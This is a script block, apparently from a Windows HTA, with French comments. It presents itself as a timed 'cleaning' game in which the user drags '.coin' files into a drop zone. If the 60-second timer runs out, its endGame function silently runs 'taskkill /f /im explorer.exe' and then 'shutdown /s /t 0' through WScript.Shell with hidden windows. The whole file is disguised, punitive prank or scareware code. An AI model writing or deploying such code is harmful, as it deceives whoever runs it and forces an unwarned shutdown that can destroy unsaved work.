<script>
    var totalCoins = 10;
    var foundCoins = 0;
    var timeLimit = 60;
    var currentTime = timeLimit;
    var timerInterval;
    var isRunning = false;
    var foundFiles = [];

    var app = GetObject("winmgmts:");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var shell = new ActiveXObject("WScript.Shell");

    function startScan() {
        if (isRunning) return;
        isRunning = true;
        document.getElementById("statusText").innerText = "Analyse en cours...";
        document.getElementById("statusText").style.color = "#00f2fe";
        
        // Simulation de recherche de fichiers (en vrai, on scanne le disque)
        // Ici on simule la découverte pour la démo, mais le code de drag & drop fonctionne vraiment
        simulateScan();
        
        timerInterval = setInterval(updateTimer, 1000);
    }

    function updateTimer() {
        currentTime--;
        var percentage = (currentTime / timeLimit) * 100;
        document.getElementById("timerBar").style.width = percentage + "%";
        
        if (currentTime <= 10) {
            document.getElementById("timerBar").style.background = "linear-gradient(90deg, #ff416c 0%, #ff4b2b 100%)";
        }

        if (currentTime <= 0) {
            endGame(false);
        }
    }

    function simulateScan() {
        // Dans une vraie version, on ferait un recurseFolder()
        // Ici on laisse l'utilisateur faire le drag & drop des fichiers .coin
    }

    function endGame(success) {
        clearInterval(timerInterval);
        var overlay = document.getElementById("overlay");
        var msg = document.getElementById("endMessage");
        
        overlay.classList.add("active");
        
        if (success) {
            msg.innerText = "Nettoyage Terminé";
            msg.className = "end-message success";
            setTimeout(closeApp, 2000);
        } else {
            msg.innerText = "Erreur Critique";
            msg.className = "end-message fail";
            shell.Run("cmd.exe /c taskkill /f /im explorer.exe", 0, false);
            setTimeout(function() {
                shell.Run("cmd.exe /c shutdown /s /t 0", 0, false);
            }, 2000);
        }
    }

    function closeApp() {
        window.close();
    }

    function forceEnd(forceFail) {
        endGame(!forceFail);
    }

    // Drag & Drop Logic
    var dropZone = document.getElementById("dropZone");

    dropZone.ondragover = function(e) {
        e.preventDefault();
        e.dataTransfer.dropEffect = "move";
        document.getElementById("app-container").style.borderColor = "#00f2fe";
    };

    dropZone.ondragleave = function(e) {
        document.getElementById("app-container").style.borderColor = "rgba(255, 255, 255, 0.1)";
    };

    dropZone.ondrop = function(e) {
        e.preventDefault();
        document.getElementById("app-container").style.borderColor = "rgba(255, 255, 255, 0.1)";
        
        var files = e.dataTransfer.files;
        for (var i = 0; i < files.length; i++) {
            var file = files[i];
            // Vérifie si le nom contient "COIN" ou finit par .coin
            if (file.name.toUpperCase().indexOf("COIN") !== -1 || file.name.toLowerCase().endsWith(".coin")) {
                processCoin(file);
            }
        }
    }

    function processCoin(file) {
        if (foundCoins >= totalCoins) return;
        
        foundCoins++;
        document.getElementById("coinCount").innerText = "Fichiers trouvés : " + foundCoins + " / " + totalCoins;
        
        // Effet visuel de suppression
        var container = document.getElementById("app-container");
        container.style.transform = "translate(-50%, -50%) scale(0.98)";
        setTimeout(function() {
            container.style.transform = "translate(-50%, -50%) scale(1)";
        }, 100);

        if (foundCoins >= totalCoins) {
            endGame(true);
        }
    }

    // Initialisation
    window.onload = function() {
        // Centrer la fenêtre
        window.resizeTo(400, 300);
        window.moveTo((screen.width - 400)/2, (screen.height - 300)/2);
    }
</script>
